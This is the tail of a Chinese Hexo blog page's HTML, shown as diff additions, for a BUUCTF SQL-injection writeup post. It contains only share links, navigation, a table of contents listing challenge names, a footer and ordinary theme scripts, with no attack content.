+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/&title=buuctf刷题-sql注入篇 - 明月归的小站&summary=本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/&title=buuctf刷题-sql注入篇 - 明月归的小站&summary=本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>buuctf刷题-代码命令注入篇</p>
+                <p class='content'>本篇博客主要介绍了buuctf上web部分代码注入和命令执行相关题目的writeup！持续更新中！
+
+
+[RoarCTF 2019]Easy Calcwriteup打开查看源码发现是通过GET请...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/'>
+                <p class='title'>buuctf刷题-代码审计篇<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了buuctf web部分代码审计题目的wp！持续更新！
+
+
+[HCTF 2018]WarmUpwriteup打开题目，查看源代码发现source.php,得到源代码，代码审计
+...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-text">[强网杯 2019]随便注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup"><span class="toc-text">writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F1"><span class="toc-text">方式1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F2"><span class="toc-text">方式2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-1"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-2"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="toc-text">[网鼎杯 2018]Fakebook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-3"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-text">[网鼎杯 2018]Comment</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-4"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="toc-text">[网鼎杯2018]Unfinish</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-5"><span class="toc-text">writeup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#writeup-6"><span class="toc-text">writeup</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
